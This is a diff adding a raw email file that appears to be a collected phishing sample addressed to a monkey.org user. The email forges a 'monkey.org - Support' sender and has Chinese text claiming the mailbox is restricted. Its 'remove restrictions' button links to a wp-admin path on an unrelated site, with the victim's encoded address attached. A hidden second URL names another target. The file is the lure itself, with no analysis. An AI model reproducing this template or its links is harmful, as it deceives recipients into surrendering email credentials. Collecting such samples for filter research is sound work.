@@ -1,0 +1,118 @@
+Return-Path: jpiotte@sparrowfoods.com
+Delivered-To: jose@monkey.org
+X-FDA: 81225581640.26.C38BB07
+Received: from s713964.srvape.com (s713964.srvape.com [188.127.249.190])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 146C51A0006
+	for <jose@monkey.org>; Mon, 11 Sep 2023 21:18:58 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf01.b.hostedemail.com: 188.127.249.190 is neither permitted nor denied by domain of jpiotte@sparrowfoods.com) smtp.mailfrom=jpiotte@sparrowfoods.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1694467139;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=vOf6CzyhAcYuFmtJgxHcD02gk+97eWk98MyGFA12T9Y=;
+	b=I1QPNHAkNhx5hrLBc/dq007qEutUXdMuKKZkSQaak8ERJIHjH2B+wZAf0TDju8Z20BL+b4
+	SjgZ33ARlXUwLxDQITTMI+Jnt02NjmB1YD+Dei0YdV7TcGMR1VXAjFNpUW/uMdhAJVGyiN
+	+5UEmmJtH4ry6P09cr8E/UpDHeNobQ0=
+ARC-Authentication-Results: i=1;
+	imf01.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf01.b.hostedemail.com: 188.127.249.190 is neither permitted nor denied by domain of jpiotte@sparrowfoods.com) smtp.mailfrom=jpiotte@sparrowfoods.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1694467139; a=rsa-sha256;
+	cv=none;
+	b=uFSUWJd3+1eUHO8Xj8ISfYO+lj3AkrNgiShE6hvvQhKkpibqyPJz9DCTh4BRCJ5WO7fNGF
+	fK9BrIriQBWMMVeiD6SRfASzQRaX150S7qbdnWfnQYsmrLm1tF62yZgNnWDOLsRehoPlIy
+	BUMtO/Gy93YxJveYcLWlHrLqDOJhPig=
+Received: from sparrowfoods.com (localhost [IPv6:::1])
+	by s713964.srvape.com (Postfix) with ESMTP id 6F3D62AA69B
+	for <jose@monkey.org>; Mon, 11 Sep 2023 21:12:25 +0000 (UTC)
+From: monkey.org - Support <jpiotte@sparrowfoods.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?W+a7peeUqOmAmuefpV3vvJrmgqjnmoTnlLXlrZDpgq7ku7bluJDmiLflt7LooqvpmZDliLbjgII=?=
+Date: 11 Sep 2023 17:12:24 -0400
+Message-ID: <20230911171224.3266491E921D270A@sparrowfoods.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: 146C51A0006
+X-Stat-Signature: xbn3t6f6ku1q4yzj3ai87u4w6s65eh4a
+X-Rspam-User: 
+X-Spam-Status: No, score=4.11
+X-HE-Tag: 1694467138-450718
+X-HE-Meta: U2FsdGVkX19IP0PGD8ZYruskQ4OC0iMk7eM4ydNtGr6f8oFAtUO0FCv16CLDm0wge11yUGFMiVwbtOyyjL+bWJetVKqeeDMrFZq6Ogkg+xKrOsB740g5zpYxfLmZTYCn0lDynjHnVxbY8HJy4HQX/QRHO5z3FE04IHMbOku6ZZOaL4ty9wfIsnSzRn3rP+W312TnpyNJIneb3gAO52sCNepy5TfifaY0vveBpE9fOYo=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 279
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
+0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
+SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
+iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
+s: initial; text-decoration-style: initial; text-decoration-color: initial"=
+><FONT size=3D4>
+&#32500;&#20462;&#20445;&#25252;</FONT></P>
+<DIV style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTE=
+R-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickn=
+ess: initial; text-decoration-style: initial; text-decoration-color: initia=
+l"><BR>
+<DIV>
+<DIV style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif, serif, EmojiFont; COLOR: rgb(0,0,0)'><SPAN style=3D"FONT-=
+SIZE: 14px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif,=
+ serif, EmojiFont"><FONT color=3D#ff0000>jose@monkey.org</FONT></SPAN></DIV=
+>
+<DIV style=3D'FONT-SIZE: 24px; FONT-FAMILY: "Google Sans", Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(0,0,0)'><SP=
+AN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif, serif, EmojiFont"><FONT color=3D#ff0000><BR></FONT></SPAN=
+></DIV>
+<DIV style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif, serif, EmojiFont; COLOR: rgb(0,0,0)'>&#30001;&#20110;&#24=
+744;&#30340;&#30005;&#23376;&#37038;&#20214;&#24080;&#25143;&#21463;&#21040=
+;&#38480;&#21046;&#65292;&#24744;&#30340;&#26576;&#20123;&#30005;&#23376;&#=
+37038;&#20214;&#21151;&#33021;&#24050;&#34987;&#26242;&#20572;&#12290;<BR><=
+/DIV>
+<DIV style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, A=
+rial, sans-serif, serif, EmojiFont; COLOR: rgb(0,0,0)'><BR></DIV><SPAN styl=
+e=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif, serif,=
+ EmojiFont; COLOR: rgb(0,0,0)"><SPAN style=3D"FONT-SIZE: 15px"></SPAN>
+<DIV style=3D"FONT-SIZE: 15px">&#35831;&#21333;&#20987;&#19979;&#38754;&#30=
+340;&#25353;&#38062;&#20197;&#39044;&#35272;&#28040;&#24687;&#24182;&#21024=
+;&#38500;&#25152;&#26377;&#38480;&#21046;&#12290;<BR><BR></DIV>
+<DIV style=3D"FONT-SIZE: 14px"><BR></DIV>
+<DIV style=3D"FONT-SIZE: 14px">
+<A style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, Helvetica, Ari=
+al, sans-serif; MIN-WIDTH: 90px; COLOR: rgb(255,255,255); PADDING-BOTTOM: 1=
+0px; PADDING-TOP: 10px; PADDING-LEFT: 24px; LINE-HEIGHT: 16px; PADDING-RIGH=
+T: 24px; BACKGROUND-COLOR: rgb(65,132,243)' href=3D"https://contest.zerodon=
+to.com/wp-admin/lin/cn4/index.html#am9zZUBtb25rZXkub3Jn" rel=3D"noreferrer =
+noopener" target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://custom-meds.=
+com/wp-admin/images/verify/VerifyCN/?email%3Dwilliam.huang@pats-crrc.com&am=
+p;source=3Dgmail&amp;ust=3D1694544118669000&amp;usg=3DAOvVaw3DbaaNRoaVlwpTh=
+VXGKd94"><SPAN style=3D'FONT-FAMILY: "Google Sans", Roboto, RobotoDraft, He=
+lvetica, Arial, sans-serif, serif, EmojiFont; FONT-WEIGHT: bolder'>&#31227;=
+&#38500;&#38480;&#21046;</SPAN></A><BR></DIV>
+<DIV style=3D"FONT-SIZE: 14px"><BR></DIV>
+<DIV style=3D"FONT-SIZE: 15px"><BR>&copy; 2023<SPAN>&nbsp;</SPAN>monkey.org=
+<SPAN>&nbsp;</SPAN>&#26381;&#21153;<BR></DIV></SPAN></DIV></DIV>
+<P><BR class=3DApple-interchange-newline></P></BODY></HTML>
+
